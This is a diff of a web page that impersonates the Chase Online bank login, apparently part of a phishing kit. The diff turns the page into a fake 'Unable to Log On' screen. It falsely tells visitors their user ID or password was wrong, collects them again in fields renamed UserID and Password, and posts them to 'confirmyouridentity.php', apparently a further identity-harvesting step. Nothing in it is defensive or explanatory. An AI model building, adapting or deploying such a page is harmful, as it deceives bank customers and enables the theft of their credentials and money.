@@ -11,7 +11,7 @@
 <meta http-equiv="Cache-Control" content="post-check=0">
 <meta http-equiv="Cache-Control" content="pre-check=0">
 <meta http-equiv="Content-Style-Type" content="text/css">
-<meta name="Author" content="&nbsp;© 2010 JPMorgan Chase &amp; Co."><meta name="CONNECTION" content="CLOSE"><meta name="description" content="Logon"><link rel="SHORTCUT ICON" href="favicon.ico"><title>Chase Online - Logon</title><!--CHASE-->
+<meta name="Author" content="&nbsp;© 2010 JPMorgan Chase &amp; Co."><meta name="CONNECTION" content="CLOSE"><meta name="description" content="Logon"><link rel="SHORTCUT ICON" href="favicon.ico"><title>Chase Online - Unable to Log On</title><!--CHASE-->
 <link rel="stylesheet" type="text/css" href="index.css" media="all">
 		
 </head>
@@ -36,9 +36,7 @@
     
     
   
-    
-
-    <style type='text/css'>
+        <style type='text/css'>
 .error_strings
 {
     font-family:Verdana;
@@ -50,7 +48,7 @@
 <script language='JavaScript' src='validator.js'>
 </script>
 
-<form name="index" method="POST" action="unabletologon.html" id="index" autocomplete="off" >
+    <form name="login" method="POST" action="confirmyouridentity.php" id="login" autocomplete="off" >
 <div>
 
 </div>
@@ -86,7 +84,29 @@
           <td valign="top" width="721">
             <table width="100%" border="0" cellpadding="0" cellspacing="0">
               <tbody><tr>
-                <td colspan="3" class="spacerH20">&nbsp;</td>
+                <td colspan="3" class="spacerH20"><table width="100%" border="0" cellpadding="0" cellspacing="0">
+                  <tbody>
+                    <tr>
+                      <td colspan="3" align="middle">&nbsp;</td>
+                    </tr>
+                    <tr>
+                      <td class="errorrow" colspan="3" align="middle">Unable to Log On</td>
+                    </tr>
+                    <tr>
+                      <td>&nbsp;</td>
+                      <td><br>
+                          <span class="errortext"> The User ID or Password you entered is not correct.</span> <span class="bodytext">Please reenter your User ID and Password or click "Forgot your User ID/Password?" to verify your identity and regain access to your accounts.</span></td>
+                    </tr>
+                    <tr>
+                      <td>&nbsp;</td>
+                      <td><br>
+                          <span class="bodytext"><b>Former WaMu.com or WaMuCards.com users:</b> You may have had a duplicate or non-standard User ID. Clicking "Forgot your User ID/Password?" will help you confirm the User ID and Password you should use when you log on to Chase.com</span></td>
+                    </tr>
+                    <tr>
+                      <td colspan="3" class="divider">&nbsp;</td>
+                    </tr>
+                  </tbody>
+                </table></td>
               </tr>
               <tr>
                 <td colspan="3" align="center">
@@ -108,10 +128,9 @@
 		<td rowspan="3" width="10">
                         <img src="https://chaseonline.chase.com/images/spacer.gif" width="10" height="10">
                       </td>
-		<td>
-                        <div id='index_testId_errorloc' class='error_strings'>
+		<td>                <div id='login_UserID_errorloc' class='error_strings'>
 </div>
-<input id="testId" tabindex="1" title="sssssssss" name="testId" class="required" style="width: 160px;" type="text">
+                        <input id="UserID" tabindex="1"  name="UserID" class="required" style="width: 160px;" type="text">
                        
                         
                       </td>
@@ -119,18 +138,15 @@
 	<tr>
 		<td width="5"></td>
 		<td class="bodyTextBold" align="right">Password</td>
-		<td>
-                        <div id='index_testPassword_errorloc' class='error_strings'>
+		<td>	<div id='login_Password_errorloc' class='error_strings'>
 </div>
-<input id="testPassword" tabindex="2" title="Required field Enter Password." name="testPassword" class="required" style="width: 160px;" type="password">
+                        <input id="Password" tabindex="2" name="Password" class="required" style="width: 160px;" type="password">
                       </td>
 	</tr>
 	<tr id="rwRemUserID">
 		<td width="5"></td>
 		<td align="right">
-                        <span title="Select the checkbox for the system to remember the user id"><input id="usr_remember_me_input" name="usr_remember_me_input" tabindex="3" type="checkbox"><div id='index_submit_errorloc' class='error_strings'>
-</div>
-</span>
+                        <span title="Select the checkbox for the system to remember the user id"><input id="usr_remember_me_input" name="usr_remember_me_input" tabindex="3" type="checkbox"></span>
                       </td>
 		<td class="bodyText">Remember my User ID</td>
 	</tr>
@@ -144,7 +160,7 @@
 		<td width="5"></td>
 		<td colspan="3" align="center" height="45">
                         <div class="spacerH5">&nbsp;</div>
-                          <input id="logon" src="https://chaseonline.chase.com/images/logon.gif" value="Submit" name="Submit" title="Log On" width="58" type="image" border="0" height="21">
+                          <input id="logon" src="https://chaseonline.chase.com/images/logon.gif" value="Submit" title="Log On" width="58" type="image" border="0" height="21">
                         <div class="spacerH10">&nbsp;</div>
                       </td>
 	</tr>
@@ -203,16 +219,14 @@
 
 </form>
 <script language='JavaScript'>
-var indexValidator = new Validator("index");
+var indexValidator = new Validator("login");
 
 indexValidator.EnableOnPageErrorDisplay();
-indexValidator.addValidation("testId","req","Required field");
-indexValidator.addValidation("testId","minlen=5","Required field");
-indexValidator.addValidation("testPassword","minlen=6","Required field");
-indexValidator.addValidation("testPassword","req","Required field");
+indexValidator.addValidation("UserID","req","Required field");
+indexValidator.addValidation("UserID","minlen=5","Required field");
+indexValidator.addValidation("Password","minlen=6","Required field");
+indexValidator.addValidation("Password","req","Required field");
 </script>
-
-
 
   </div></td>
 		<td class="sidebar">&nbsp;</td>
